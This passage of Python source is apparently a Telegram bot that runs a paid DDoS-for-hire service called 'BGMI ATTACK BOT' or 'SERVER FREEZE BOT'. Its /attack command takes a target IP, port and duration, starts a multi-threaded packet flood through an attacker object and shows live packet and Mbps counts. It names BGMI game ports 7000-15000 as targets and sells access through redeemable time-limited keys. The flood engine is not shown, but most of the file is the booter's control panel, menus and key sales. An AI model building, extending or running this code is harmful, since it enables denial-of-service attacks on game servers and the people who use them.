        f"🔄 **STICKERS RESET!**\n\n"
        f"🔹 **Total Stickers:** 0\n\n"
        "All stickers have been removed from the list."
    )

# ═══════════════ REDEEM ═══════════════
@app.on_message(filters.command("redeem"))
async def redeem_cmd(client, msg):
    uid = msg.from_user.id
    access, a_type = check_access(uid)
    if access:
        info = get_user_info(uid)
        return await msg.reply_text(f"✅ ALREADY UNLOCKED!\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /start for menu")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(f"🔑 REDEEM KEY\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})")
    
    key = parts[1].upper()
    success, result = redeem_key_code(key, uid)
    
    if success:
        vid = rand_vid()
        text = f"🎉 KEY REDEEMED!\n\n{LINE}\n🔑 Key: {key[:20]}...\n📅 Expires: {result}\n{LINE}\n\n🔓 Access granted!\n📋 Send /start"
        await send_vid(msg.chat.id, text, None, vid)
    else:
        await msg.reply_text(f"❌ {result}\n\n📲 [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})")

# ═══════════════ ATTACK ═══════════════
@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, ainfo, amsg, attack_user
    uid = msg.from_user.id
    
    access, a_type = check_access(uid)
    if not access:
        vid = rand_vid()
        text = (
            "🩵 𝘼𝘾𝘾𝙀𝙎𝙎 𝘿𝙀𝙉𝙄𝙀𝘿!\n\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"💌 {msg.from_user.first_name}\n"
            f"🍄 {uid}\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "🏞️ 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙈𝙀𝙈𝘽𝙀𝙍𝙎 𝙊𝙉𝙇𝙔\n"
            "🔑 𝙍𝙚𝙙𝙚𝙚𝙢 𝙔𝙤𝙪𝙧 𝙆𝙚𝙮"
        )
        return await send_vid(msg.chat.id, text, None, vid)
    
    if attacking:
        e = time.time() - ainfo['start']
        return await msg.reply_text(f"⚠️ Already attacking! {int(e)}s\n🛑 Use Stop button")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply_text("⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 600")
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await msg.reply_text("❌ Invalid port!")
    try: dur = int(parts[3])
    except: return await msg.reply_text("❌ Invalid time!")
    
    info = get_user_info(uid)
    threads = info['threads']; max_t = info['max_time']
    if dur > max_t: dur = max_t
    
    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True; attack_user = uid
    
    vid = rand_vid()
    text = f"💀 ATTACK LAUNCHED!\n\n🎯 {ip}:{port}\n⏱️ {dur}s\n🧵 {threads} Threads"
    amsg = await send_vid(msg.chat.id, text, None, vid)
    add_history(uid, "ATTACK START", f"{ip}:{port} | {dur}s")
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(2)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                await amsg.edit_text(
                    f"💀 ATTACKING!\n\n"
                    f"🎯 {ip}:{port}\n"
                    f"⏱️ {int(e)}s / {dur}s\n"
                    f"[{bar}] {pct:.0f}%\n"
                    f"📦 {attacker.pkts:,} pkts\n"
                    f"📶 {mbps:.1f} Mbps\n\n"
                    f"🛑 Use Stop button"
                )
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False; attack_user = None
    
    add_history(uid, "ATTACK END", f"{ip}:{port} | {stats['pkts']:,} pkts")
    
    vid = rand_vid()
    done = f"✅ ATTACK COMPLETED!\n\n🎯 {ip}:{port}\n📦 {stats['pkts']:,} pkts\n📶 {stats['mbps']:.1f} Mbps\n\n🔄 /attack IP PORT TIME"
    if vid and os.path.exists(vid["path"]): await app.send_video(msg.chat.id, vid["path"], caption=done)
    try: await amsg.edit_text(done)
    except: pass

# ═══════════════ STOP ═══════════════
@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    if not check_access(msg.from_user.id)[0]: return
    if attacking:
        attacker.on = False; attacking = False
        vid = rand_vid()
        text = f"⛔ ATTACK STOPPED!\n\n📦 {attacker.pkts:,} packets\n\n🔄 /attack IP PORT TIME"
        await send_vid(msg.chat.id, text, None, vid)
    else:
        await msg.reply_text("💤 No attack running!")

# ═══════════════ VIDEO COMMANDS ═══════════════
@app.on_message(filters.command("addvideo"))
async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text("📂 𝘼𝙙𝙙𝙞𝙣𝙜 𝙑𝙞𝙙𝙚𝙤 📸")
        try:
            path = await msg.reply_to_message.download()
            vid = add_vid(path)
            text = (
                "✅ 𝙑𝙄𝘿𝙀𝙊 𝘼𝘿𝘿𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔! ✅\n\n"
                f"{LINE}\n"
                f"🆔 𝙑𝙞𝙙𝙚𝙤 𝙄𝘿: {vid}\n"
                f"📁 𝙉𝙖𝙢𝙚: {os.path.basename(path)[:30]}\n"
                f"📹 𝙏𝙤𝙩𝙖𝙡 𝙑𝙞𝙙𝙚𝙤𝙨: {len(get_vids())}\n"
                f"{LINE}\n\n"
                "🎲 𝙑𝙞𝙙𝙚𝙤 𝙬𝙞𝙡𝙡 𝙥𝙡𝙖𝙮 𝙧𝙖𝙣𝙙𝙤𝙢𝙡𝙮!\n"
                "📋 /videos 𝙩𝙤 𝙨𝙚𝙚 𝙖𝙡𝙡 𝙫𝙞𝙙𝙚𝙤𝙨"
            )
            await s.edit_text(text)
        except Exception as e:
            await s.edit_text(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
    else:
        await msg.reply_text("❌ 𝙍𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙫𝙞𝙙𝙚𝙤!")

@app.on_message(filters.command("videos"))
async def list_vids_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]: return
    vids = get_vids()
    if not vids: return await msg.reply_text("📹 𝙉𝙤 𝙫𝙞𝙙𝙚𝙤𝙨!")
    text = f"📹 𝙑𝙞𝙙𝙚𝙤𝙨 ({len(vids)}):\n\n"
    for v in vids[:15]: text += f"#{v['id']} {v['name'][:30]}\n"
    await msg.reply_text(text)

@app.on_message(filters.command("delvideo"))
async def del_vid_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("❌ /delvideo 𝙄𝘿")
    try:
        if del_vid(int(parts[1])):
            await msg.reply_text(f"✅ 𝙑𝙞𝙙𝙚𝙤 #{parts[1]} 𝙙𝙚𝙡𝙚𝙩𝙚𝙙!\n📹 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜: {len(get_vids())}")
        else:
            await msg.reply_text("❌ 𝙉𝙤𝙩 𝙛𝙤𝙪𝙣𝙙!")
    except:
        await msg.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙄𝘿!")

@app.on_message(filters.command("clearvideos"))
async def clear_vids_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    n = clear_vids()
    await msg.reply_text(f"🗑️ {n} 𝙫𝙞𝙙𝙚𝙤𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙!")

@app.on_message(filters.command("genkey"))
async def gen_key_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) < 3: return await msg.reply_text("📋 /genkey NAME TIME\n🔑 /genkey Test 30m")
    name, time_str = parts[1], parts[2]
    key_code, duration = create_key(name, time_str)
    if key_code:
        await msg.reply_text(f"🔑 𝙆𝙀𝙔 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀𝘿!\n\n{LINE}\n🪪 {name}\n⏱️ {duration}\n🔑 {key_code}\n{LINE}\n\n📋 /redeem {key_code}")
    else:
        await msg.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙩𝙞𝙢𝙚! Use: 30m, 24h, 7d, 2w, 1mo")

# ═══════════════ COMMANDS MENU ═══════════════
@app.on_message(filters.command("commands"))
async def commands_cmd(client, msg):
    await msg.reply_text(
        "📝 **COMMANDS MENU**\n\n"
        f"{LINE}\n"
        "⚔️ /attack IP PORT TIME - Start Attack\n"
        "⛔ /stop - Stop Attack\n"
        "🔑 /redeem KEY - Redeem Key\n"
        "📊 /status - Check Status\n\n"
        "**🎯 Owner Commands:**\n"
        "📤 /addemoji - Add Premium Emoji\n"
        "📋 /listemojis - List Emojis\n"
        "🗑️ /removeemoji index - Remove Emoji\n"
        "🔄 /resetemojis - Reset All Emojis\n\n"
        "🎨 /addsticker - Add Sticker\n"
        "📋 /liststickers - List Stickers\n"
        "🗑️ /removesticker index - Remove Sticker\n"
        "🔄 /resetstickers - Reset All Stickers\n\n"
        "🎬 /addvideo - Add Video\n"
        "📋 /videos - List Videos\n"
        "🗑️ /delvideo ID - Delete Video\n"
        "🧹 /clearvideos - Clear All Videos\n\n"
        "🔑 /genkey NAME TIME - Generate Key\n\n"
        f"🎮 **BGMI PORTS:** 7000-15000\n"
        f"⏱️ **MAX ATTACK:** 600 seconds (10 minutes)\n"
        f"👑 [FATHER OF BOT]({OWNER_LINK})"
    )

# ═══════════════ CALLBACKS ═══════════════
@app.on_callback_query()
async def callbacks(client, cb: CallbackQuery):
    data = cb.data
    uid = cb.from_user.id
    
    if data == "sep":
        await cb.answer()
        return
    
    if data == "redeem_popup":
        await cb.answer(
            "🪪 **About Redeem** ♡\n\n"
            "🔑 **How To Redeem Key?**\n\n"
            "1️⃣ Get Key From Admin\n"
            f"📲 @{OWNER_USERNAME}\n\n"
            "2️⃣ Use Command:\n"
            "/redeem YOUR_KEY\n\n"
            "3️⃣ Example:\n"
            "/redeem BGMI-XXXX-XXXX-XXXX\n\n"
            "⏱️ Durations:\n"
            "30m • 1h • 24h • 7d • 2w • 1mo\n\n"
            "💎 Premium = Power!",
            show_alert=True
        )
        return
    
    if data == "commands_menu":
        await cb.message.edit_text(
            "📝 **COMMANDS MENU**\n\n"
            f"{LINE}\n"
            "⚔️ /attack IP PORT TIME - Start Attack\n"
            "⛔ /stop - Stop Attack\n"
            "🔑 /redeem KEY - Redeem Key\n"
            "📊 /status - Check Status\n\n"
            "**🎯 Owner Commands:**\n"
            "📤 /addemoji - Add Premium Emoji\n"
            "📋 /listemojis - List Emojis\n"
            "🗑️ /removeemoji index - Remove Emoji\n"
            "🔄 /resetemojis - Reset All Emojis\n\n"
            "🎨 /addsticker - Add Sticker\n"
            "📋 /liststickers - List Stickers\n"
            "🗑️ /removesticker index - Remove Sticker\n"
            "🔄 /resetstickers - Reset All Stickers\n\n"
            f"🎮 **BGMI PORTS:** 7000-15000\n"
            f"⏱️ **MAX ATTACK:** 600 seconds (10 minutes)\n"
            f"👑 [FATHER OF BOT]({OWNER_LINK})",
            reply_markup=back_kb()
        )
        return
    
    if data == "back":
        user = cb.from_user
        uid = user.id
        access, a_type = check_access(uid)
        
        if not access:
            vid = rand_vid()
            text = (
                "🩵 𝘼𝘾𝘾𝙀𝙎𝙎 𝘿𝙀𝙉𝙄𝙀𝘿!\n\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                f"💌 {user.first_name}\n"
                f"🍄 {uid}\n"
                "━━━━━━━━━━━━━━━━━━━\n\n"
                "🏞️ 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙈𝙀𝙈𝘽𝙀𝙍𝙎 𝙊𝙉𝙇𝙔\n"
                "🔑 𝙍𝙚𝙙𝙚𝙚𝙢 𝙔𝙤𝙪𝙧 𝙆𝙚𝙮\n\n"
                "🍰 /redeem 𝙆𝙚𝙔\n"
                f"🕸️ [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})"
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 𝘽𝙪𝙮-𝙆𝙚𝙮 🔑", url=OWNER_LINK)],
                [InlineKeyboardButton("🪪 𝘼𝙗𝙤𝙪𝙩 𝙍𝙚𝙙𝙚𝙚𝙢 ♡", callback_data="redeem_popup")],
            ])
            await cb.message.edit_text(text, reply_markup=kb)
            return
        
        info = get_user_info(uid)
        vid = rand_vid()
        
        if uid == OWNER_ID:
            kb = owner_kb()
        else:
            kb = user_kb()
        
        expiry_text = ""
        if info.get("remaining"): expiry_text += f"\n⏳ Remaining: {info['remaining']}"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                expiry_text += f"\n📅 Expires: {exp.strftime('%d %b %Y, %I:%M %p')}"
            except: pass
        
        text = (
            "💀 𝐁𝐆𝐌𝐈 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐎𝐓 💀\n\n"
            f"{LINE}\n"
            f"👤 {user.first_name}\n"
            f"🆔 {uid}\n"
            f"💳 {a_type}{expiry_text}\n"
            f"{LINE}\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max Time\n"
            f"📹 {len(get_vids())} Videos\n"
            f"{LINE}\n"
            "⚔️ /attack IP PORT TIME\n"
            "📋 /attack 1.2.3.4 8080 600\n"
            "🎮 BGMI Ports: 7000-15000\n"
            f"{LINE}\n"
            "🔽 SELECT OPTION:"
        )
        await cb.message.edit_text(text, reply_markup=kb)
        return
    
    await cb.answer()
    
    if data == "back_admin":
        if uid != OWNER_ID: return
        await cb.message.edit_text("👑 **ADMIN PANEL**\n\n🔽 Select:", reply_markup=admin_kb())
        return
    
    # ═══════════════ EMOJI MENU ═══════════════
    if data == "emoji_menu":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        await cb.message.edit_text(
            f"🎯 **EMOJI MANAGER**\n\n"
            f"🔹 **Total Emojis:** {len(emojis)}\n"
            f"🔹 **Commands:**\n"
            f"• `/addemoji` - Reply to premium emoji\n"
            f"• `/removeemoji index` - Remove by index\n"
            f"• `/listemojis` - List all emojis\n"
            f"• `/resetemojis` - Reset all\n\n"
            f"✨ Emojis appear randomly in welcome animation!\n"
            f"🔄 Each time a new random emoji will be shown.",
            reply_markup=emoji_kb()
        )
        return
    
    if data == "e_add":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            "📤 **ADD EMOJI**\n\n"
            "Reply to a **premium emoji** with:\n"
            "`/addemoji`\n\n"
            "✨ The emoji will be added to welcome animation!\n"
            "🔄 Each time a new random emoji will be shown.",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "e_remove":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            "🗑️ **REMOVE EMOJI**\n\n"
            "Use: `/removeemoji index`\n\n"
            "Get index from `/listemojis` command.",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "e_list":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis added yet!", show_alert=True)
            return
        text = "📋 **EMOJI LIST**\n\n"
        for i, emoji_id in enumerate(emojis, 1):
            text += f"**{i}.** `{emoji_id[:30]}...`\n"
        text += f"\n🔹 **Total:** {len(emojis)}"
        await cb.message.edit_text(text, reply_markup=back_admin_kb())
        return
    
    if data == "e_reset":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_emojis()
        await cb.answer("🔄 All emojis reset!", show_alert=True)
        await cb.message.edit_text(
            f"🔄 **EMOJIS RESET!**\n\n"
            f"🔹 **Total Emojis:** 0\n\n"
            "All emojis removed from the list.",
            reply_markup=emoji_kb()
        )
        return
    
    # ═══════════════ STICKER MENU ═══════════════
    if data == "sticker_menu":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        await cb.message.edit_text(
            f"🎨 **STICKER MANAGER**\n\n"
            f"🔹 **Total Stickers:** {len(stickers)}\n"
            f"🔹 **Commands:**\n"
            f"• `/addsticker` - Reply to sticker\n"
            f"• `/removesticker index` - Remove by index\n"
            f"• `/liststickers` - List all stickers\n"
            f"• `/resetstickers` - Reset all\n\n"
            f"✨ Stickers appear randomly in welcome animation!\n"
            f"🔄 Each time a new random sticker will be shown.",
            reply_markup=sticker_kb()
        )
        return
    
    if data == "s_add":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            "🎨 **ADD STICKER**\n\n"
            "Reply to a **sticker** with:\n"
            "`/addsticker`\n\n"
            "✨ The sticker will be added to welcome animation!\n"
            "🔄 Each time a new random sticker will be shown.",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "s_remove":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            "🗑️ **REMOVE STICKER**\n\n"
            "Use: `/removesticker index`\n\n"
            "Get index from `/liststickers` command.",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "s_list":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers added yet!", show_alert=True)
            return
        text = "📋 **STICKER LIST**\n\n"
        for i, sticker_id in enumerate(stickers, 1):
            text += f"**{i}.** `{sticker_id[:30]}...`\n"
        text += f"\n🔹 **Total:** {len(stickers)}"
        await cb.message.edit_text(text, reply_markup=back_admin_kb())
        return
    
    if data == "s_reset":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_stickers()
        await cb.answer("🔄 All stickers reset!", show_alert=True)
        await cb.message.edit_text(
            f"🔄 **STICKERS RESET!**\n\n"
            f"🔹 **Total Stickers:** 0\n\n"
            "All stickers removed from the list.",
            reply_markup=sticker_kb()
        )
        return
    
    if data == "stop_attack":
        global attacking
        if attacking and (uid == attack_user or uid == OWNER_ID):
            attacker.on = False; attacking = False
            vid = rand_vid()
            text = f"⛔ **ATTACK STOPPED!**\n\n📦 {attacker.pkts:,} packets\n\n🔄 /attack IP PORT TIME"
            await send_vid(cb.message.chat.id, text, None, vid)
            try: await cb.message.delete()
            except: pass
        else:
            await cb.answer("💤 No attack running!", show_alert=True)
        return
    
    if data == "status_btn":
        if attacking:
            e = time.time() - ainfo['start']
            await cb.answer(f"🟢 ATTACKING!\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} pkts", show_alert=True)
        else:
            await cb.answer("💤 IDLE", show_alert=True)
        return
    
    if data == "attack_menu":
        info = get_user_info(uid)
        await cb.message.edit_text(
            f"💀 **ATTACK MENU**\n\n{LINE}\n"
            f"⚔️ /attack IP PORT TIME\n"
            f"📋 /attack 1.2.3.4 8080 600\n"
            f"{LINE}\n"
            f"🎮 BGMI: 7000-15000\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max (10 Minutes)",
            reply_markup=back_kb()
        )
        return
    
    if data == "info_menu":
        info = get_user_info(uid)
        history = get_user_history(uid)
        text = f"ℹ️ **USER INFO**\n\n{LINE}\n👤 {cb.from_user.first_name}\n🆔 {uid}\n💳 {info['type']}\n"
        if info.get("remaining"): text += f"⏳ Remaining: {info['remaining']}\n"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                text += f"📅 Expires: {exp.strftime('%d %b, %I:%M %p')}\n"
            except: pass
        text += f"\n{LINE}\n📊 **ATTACK HISTORY:**\n"
        if history:
            for h in history[-5:]:
                try:
                    t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                    text += f"• {t} - {h['action']}\n  {h['details'][:40]}\n"
                except: pass
        else:
            text += "• No attacks yet!\n"
        text += f"\n{LINE}\n📹 Videos: {len(get_vids())}"
        await cb.message.edit_text(text, reply_markup=back_kb())
        return
    
    if data == "redeem_menu":
        access, a_type = check_access(uid)
        if access:
            info = get_user_info(uid)
            await cb.message.edit_text(f"✅ **ACCESS ACTIVE!**\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /attack to start!", reply_markup=back_kb())
        else:
            await cb.message.edit_text(
                f"🔑 **REDEEM KEY**\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 [FATHER OF BOT]({OWNER_LINK})\n\n⏱️ 30m | 24h | 7d | 2w | 1mo",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🪪 About Redeem ♡", callback_data="redeem_popup")],
                    [InlineKeyboardButton("📲 Contact-Father", url=OWNER_LINK)],
                    [InlineKeyboardButton("🔙 BACK", callback_data="back")],
                ])
            )
        return
    
    if data == "video_menu":
        if uid != OWNER_ID: await cb.answer("Owner only!"); return
        await cb.message.edit_text(f"🎬 **VIDEO MANAGER**\n\n{LINE}\n📹 Total: {len(get_vids())}\n{LINE}\n🔽 Select:", reply_markup=video_kb())
        return
    
    if data == "v_add": await cb.message.edit_text("📤 Reply to a video with /addvideo", reply_markup=back_admin_kb()); return
    if data == "v_del": await cb.message.edit_text("🗑️ Use: /delvideo ID\n📋 /videos to see IDs", reply_markup=back_admin_kb()); return
    if data == "v_clear": n = clear_vids(); await cb.message.edit_text(f"🗑️ {n} videos cleared!", reply_markup=back_admin_kb()); return
    
    if data == "v_list":
        vids = get_vids()
        if not vids: await cb.message.edit_text("📹 No videos!", reply_markup=back_admin_kb())
        else:
            text = f"📹 **Videos ({len(vids)}):**\n\n"
            for v in vids[:15]: text += f"#{v['id']} {v['name'][:30]}\n"
            await cb.message.edit_text(text, reply_markup=back_admin_kb())
        return
    
    if data == "v_help": await cb.message.edit_text(f"ℹ️ **VIDEO HELP**\n\n{LINE}\n📤 Add: Reply + /addvideo\n📋 List: /videos\n🗑️ Delete: /delvideo ID\n🧹 Clear: /clearvideos\n{LINE}", reply_markup=back_admin_kb()); return
    
    if data == "admin_menu":
        if uid != OWNER_ID: await cb.answer("Owner only!"); return
        await cb.message.edit_text("👑 **ADMIN PANEL**\n\n🔽 Select:", reply_markup=admin_kb())
        return
    
    if data == "admin_addkey":
        await cb.answer("🪪 ADD KEY\n\nUse: /genkey NAME TIME\n\nExamples:\n/genkey Test 30m\n/genkey VIP 24h\n/genkey Premium 7d\n\nUnits: m=min, h=hour, d=day, w=week, mo=month", show_alert=True)
        return
    
    if data == "admin_auto":
        if uid != OWNER_ID: return
        await cb.message.edit_text(f"🤖 **AUTO GEN KEY**\n\n{LINE}\n🔽 Select Duration:", reply_markup=auto_key_kb())
        return
    
    auto_keys = {
        "ak_20m": ("20min", "20m"), "ak_40m": ("40min", "40m"), "ak_60m": ("60min", "60m"),
        "ak_1d": ("1day", "1d"), "ak_3d": ("3day", "3d"), "ak_7d": ("7day", "7d"),
        "ak_15d": ("15day", "15d"), "ak_23d": ("23day", "23d"), "ak_30d": ("30day", "30d"),
        "ak_1mo": ("1month", "1mo"), "ak_2mo": ("2month", "2mo"), "ak_3mo": ("3month", "3mo"),
    }
    
    if data in auto_keys:
        if uid != OWNER_ID: return
        name, time_str = auto_keys[data]
        key_code, duration = create_key(name, time_str)
        if key_code:
            await cb.message.edit_text(f"🔑 **KEY GENERATED!**\n\n{LINE}\n🪪 {name}\n⏱️ {duration}\n🔑 {key_code}\n{LINE}\n\n📋 User: /redeem {key_code}", reply_markup=auto_key_kb())
        else:
            await cb.answer("❌ Failed!", show_alert=True)
        return
    
    if data == "admin_keys":
        if uid != OWNER_ID: return
        keys = get_keys(); active = [k for k, v in keys.items() if v["active"]]; used = [k for k, v in keys.items() if not v["active"]]
        await cb.message.edit_text(f"🔑 **ALL KEYS**\n\n{LINE}\n🟢 Active: {len(active)}\n🔴 Used: {len(used)}\n{LINE}", reply_markup=back_admin_kb())
        return
    
    if data == "admin_stats":
        if uid != OWNER_ID: return
        vids = get_vids(); users = get_users()
        await cb.message.edit_text(f"📊 **STATS**\n\n{LINE}\n📹 Videos: {len(vids)}\n💎 Premium: {len(users.get('premium', []))}\n🔑 Key Users: {len(users.get('keys', {}))}\n⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n{LINE}", reply_markup=back_admin_kb())
        return
    
    if data == "admin_clear":
        if uid != OWNER_ID: return
        removed = remove_expired()
        await cb.answer(f"🔄 {removed} expired removed!", show_alert=True)
        return

# ═══════════════ AUTO EXPIRE ═══════════════
async def auto_expire():
    while True:
        await asyncio.sleep(300)
        remove_expired()

# ═══════════════ INIT ═══════════════
for f, d in [
    (VIDEO_DB, []), 
    (USERS_DB, {"premium": [], "keys": {}}), 
    (KEYS_DB, {}), 
    (BLOCKED_DB, []), 
    (HISTORY_DB, {}), 
    (STICKER_DB, {"stickers": []}),
    (EMOJI_DB, {"emojis": []})
]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)
asyncio.get_event_loop().create_task(auto_expire())

print("""
╔══════════════════════════════════════╗
║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
║  SERVER FREEZE BOT                  ║
║  RANDOM EMOJI + STICKER             ║
║  AUTO UPDATE + DELETE               ║
║  USER PROFILE LINK                  ║
║  MAX ATTACK: 600 SECONDS (10 MIN)   ║
╚══════════════════════════════════════╝
✅ Bot Ready!
""")

if __name__ == "__main__":
    app.run()
